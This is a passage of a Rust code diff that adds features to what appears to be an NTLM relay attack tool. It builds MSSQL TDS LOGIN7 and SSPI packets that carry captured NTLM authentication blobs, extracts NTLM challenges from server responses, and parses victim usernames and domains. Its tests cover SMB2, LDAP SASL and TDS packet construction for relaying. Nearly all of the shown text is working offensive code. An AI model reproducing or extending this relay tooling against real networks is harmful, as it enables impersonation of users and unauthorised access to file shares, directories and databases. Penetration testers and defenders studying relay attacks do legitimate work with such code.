+    // OptionFlags2: INIT_LANG_FATAL | ODBC_ON | USER_NORMAL | INTEGRATED_SECURITY_ON
+    msg.push(0x03);
+    // TypeFlags: SQL_DFLT
+    msg.push(0x00);
+    // OptionFlags3
+    msg.push(0x00);
+    msg.extend_from_slice(&0i32.to_le_bytes()); // ClientTimeZone
+    msg.extend_from_slice(&0x00000409u32.to_le_bytes()); // ClientLCID (en-US)
+
+    // ── Offset/Length pairs (each is offset:u16, length:u16) ──
+    // Variable data starts after the 94-byte fixed portion.
+    // Offset is from the start of the LOGIN7 data (not TDS header).
+    let var_data_offset: u16 = 94;
+
+    // All string fields point to offset var_data_offset with length 0 (empty)
+    // ibHostName, cchHostName
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibUserName, cchUserName
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibPassword, cchPassword
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibAppName, cchAppName
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibServerName, cchServerName
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibExtension (unused, 0)
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibCltIntName, cchCltIntName
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibLanguage, cchLanguage
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+    // ibDatabase, cchDatabase
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+
+    // ClientID (6 bytes MAC address — zeroed)
+    msg.extend_from_slice(&[0u8; 6]);
+
+    // ibSSPI, cbSSPI — THIS IS THE KEY FIELD
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    let sspi_len = ntlm_data.len() as u16;
+    msg.extend_from_slice(&sspi_len.to_le_bytes());
+
+    // ibAtchDBFile, cchAtchDBFile
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+
+    // ibChangePassword, cchChangePassword
+    msg.extend_from_slice(&var_data_offset.to_le_bytes());
+    msg.extend_from_slice(&0u16.to_le_bytes());
+
+    // cbSSPILong (u32) — for SSPI > 65535 bytes
+    msg.extend_from_slice(&(ntlm_data.len() as u32).to_le_bytes());
+
+    // Pad to 94 bytes if needed
+    while msg.len() - login_start < 94 {
+        msg.push(0);
+    }
+
+    // ── Variable data: SSPI blob ──
+    msg.extend_from_slice(ntlm_data);
+
+    // Patch LOGIN7 total length
+    let login_len = (msg.len() - login_start) as u32;
+    msg[login_start..login_start + 4].copy_from_slice(&login_len.to_le_bytes());
+
+    // Patch TDS packet length
+    let tds_len = msg.len() as u16;
+    msg[2..4].copy_from_slice(&tds_len.to_be_bytes());
+
+    msg
+}
+
+/// Build TDS SSPI continuation packet (type 0x11)
+fn build_tds_sspi_message(ntlm_data: &[u8]) -> Vec<u8> {
+    let tds_len = (8 + ntlm_data.len()) as u16;
+    let mut msg = Vec::with_capacity(tds_len as usize);
+
+    msg.push(0x11); // Type: TDS7_AUTH (SSPI)
+    msg.push(0x01); // Status: EOM
+    msg.extend_from_slice(&tds_len.to_be_bytes()); // Length
+    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
+    msg.push(0x02); // PacketID
+    msg.push(0x00); // Window
+
+    msg.extend_from_slice(ntlm_data);
+    msg
+}
+
+/// Extract NTLM challenge from TDS response
+fn extract_ntlm_from_tds(data: &[u8]) -> Result<Vec<u8>> {
+    // Scan for NTLMSSP signature
+    for i in 0..data.len().saturating_sub(12) {
+        if &data[i..i + 8] == NTLM_SIGNATURE {
+            if let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..]) {
+                let end = find_ntlm_challenge_end(&data[i..]);
+                return Ok(data[i..i + end].to_vec());
+            }
+        }
+    }
+    Err(RelayError::Protocol("No NTLM challenge in TDS response".into()).into())
 }
 
 // ═══════════════════════════════════════════════════════════
-// Helper Functions
+// Utility Functions
 // ═══════════════════════════════════════════════════════════
+
+/// Parse username/domain from NTLM AUTHENTICATE message
+pub fn parse_ntlm_authenticate_info(data: &[u8]) -> Result<(String, String)> {
+    if data.len() < 64 {
+        return Err(RelayError::Protocol("NTLM authenticate too short".into()).into());
+    }
+
+    if &data[0..8] != NTLM_SIGNATURE {
+        return Err(RelayError::Protocol("Invalid NTLM signature".into()).into());
+    }
+
+    if parse_ntlm_type(data) != Some(NtlmMessageType::Authenticate) {
+        return Err(RelayError::Protocol("Not an AUTHENTICATE message".into()).into());
+    }
+
+    fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
+        if offset + 8 > data.len() {
+            return None;
+        }
+        let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
+        let buffer_offset = u32::from_le_bytes([
+            data[offset + 4],
+            data[offset + 5],
+            data[offset + 6],
+            data[offset + 7],
+        ]) as usize;
+
+        if len == 0 {
+            return Some(Vec::new());
+        }
+        if buffer_offset + len <= data.len() {
+            Some(data[buffer_offset..buffer_offset + len].to_vec())
+        } else {
+            None
+        }
+    }
+
+    let domain_bytes = extract_field(data, 28).unwrap_or_default();
+    let username_bytes = extract_field(data, 36).unwrap_or_default();
+
+    let domain = decode_utf16le(&domain_bytes);
+    let username = decode_utf16le(&username_bytes);
+
+    Ok((username, domain))
+}
 
 /// Decode UTF-16LE bytes to String
 fn decode_utf16le(data: &[u8]) -> String {
     if data.is_empty() {
         return String::new();
     }
-
     let chars: Vec<u16> = data
         .chunks_exact(2)
         .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
         .collect();
-
     String::from_utf16_lossy(&chars)
 }
 
@@ -1015,7 +1396,7 @@ fn base64_encode(data: &[u8]) -> String {
 /// Base64 decode
 fn base64_decode(data: &str) -> Option<Vec<u8>> {
     use base64::{Engine, engine::general_purpose::STANDARD};
-    STANDARD.decode(data).ok()
+    STANDARD.decode(data.trim()).ok()
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -1072,27 +1453,32 @@ mod tests {
     #[test]
     fn test_ntlm_type_parsing() {
         let negotiate = [
-            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
-            0x01, 0x00, 0x00, 0x00, // Type 1
+            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x01, 0x00, 0x00, 0x00,
         ];
-        assert_eq!(parse_ntlm_type(&negotiate), Some(NtlmMessageType::Negotiate));
+        assert_eq!(
+            parse_ntlm_type(&negotiate),
+            Some(NtlmMessageType::Negotiate)
+        );
 
         let challenge = [
-            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
-            0x02, 0x00, 0x00, 0x00, // Type 2
+            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00,
         ];
-        assert_eq!(parse_ntlm_type(&challenge), Some(NtlmMessageType::Challenge));
+        assert_eq!(
+            parse_ntlm_type(&challenge),
+            Some(NtlmMessageType::Challenge)
+        );
 
         let authenticate = [
-            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
-            0x03, 0x00, 0x00, 0x00, // Type 3
+            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00,
         ];
-        assert_eq!(parse_ntlm_type(&authenticate), Some(NtlmMessageType::Authenticate));
+        assert_eq!(
+            parse_ntlm_type(&authenticate),
+            Some(NtlmMessageType::Authenticate)
+        );
     }
 
     #[test]
     fn test_decode_utf16le() {
-        // "test" in UTF-16LE
         let data = [0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00];
         let result = decode_utf16le(&data);
         assert_eq!(result, "test");
@@ -1104,5 +1490,71 @@ mod tests {
         let encoded = base64_encode(data);
         let decoded = base64_decode(&encoded).unwrap();
         assert_eq!(data.to_vec(), decoded);
+    }
+
+    #[test]
+    fn test_smb2_negotiate_structure() {
+        let pdu = build_smb2_negotiate(0);
+        // NetBIOS(4) + SMB2 header(64) + body(36+6 dialects)
+        assert!(pdu.len() >= 68 + 36 + 6);
+        // Check magic
+        assert_eq!(&pdu[4..8], b"\xfeSMB");
+        // Check command = NEGOTIATE (0x0000)
+        assert_eq!(&pdu[16..18], &0x0000u16.to_le_bytes());
+    }
+
+    #[test]
+    fn test_smb2_session_setup_structure() {
+        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00test";
+        let pdu = build_smb2_session_setup(ntlm, 0x1234, 1);
+        // Check magic
+        assert_eq!(&pdu[4..8], b"\xfeSMB");
+        // Check command = SESSION_SETUP (0x0001)
+        assert_eq!(&pdu[16..18], &0x0001u16.to_le_bytes());
+        // Check session ID at offset 44..52 (after netbios+4)
+        let sid = u64::from_le_bytes([
+            pdu[48], pdu[49], pdu[50], pdu[51], pdu[52], pdu[53], pdu[54], pdu[55],
+        ]);
+        assert_eq!(sid, 0x1234);
+    }
+
+    #[test]
+    fn test_ber_encode_length() {
+        assert_eq!(ber_encode_length(5), vec![5]);
+        assert_eq!(ber_encode_length(127), vec![127]);
+        assert_eq!(ber_encode_length(128), vec![0x81, 128]);
+        assert_eq!(ber_encode_length(300), vec![0x82, 0x01, 0x2C]);
+    }
+
+    #[test]
+    fn test_ldap_sasl_bind_is_valid_ber() {
+        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00testdata1234567890";
+        let bind = build_ldap_sasl_bind(ntlm, 1);
+        // Must start with SEQUENCE tag
+        assert_eq!(bind[0], 0x30);
+        // Must contain "GSS-SPNEGO"
+        let contains_mechanism = bind.windows(10).any(|w| w == b"GSS-SPNEGO");
+        assert!(contains_mechanism);
+    }
+
+    #[test]
+    fn test_tds_prelogin_header() {
+        let pdu = build_tds_prelogin();
+        assert_eq!(pdu[0], 0x12); // PRELOGIN
+        assert_eq!(pdu[1], 0x01); // EOM
+        let len = u16::from_be_bytes([pdu[2], pdu[3]]);
+        assert_eq!(len as usize, pdu.len());
+    }
+
+    #[test]
+    fn test_tds_login7_sspi() {
+        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00";
+        let pdu = build_tds_login7_sspi(ntlm);
+        assert_eq!(pdu[0], 0x10); // LOGIN7
+        let tds_len = u16::from_be_bytes([pdu[2], pdu[3]]);
+        assert_eq!(tds_len as usize, pdu.len());
+        // SSPI data should be at the end
+        let end = &pdu[pdu.len() - ntlm.len()..];
+        assert_eq!(end, ntlm);
     }
 }
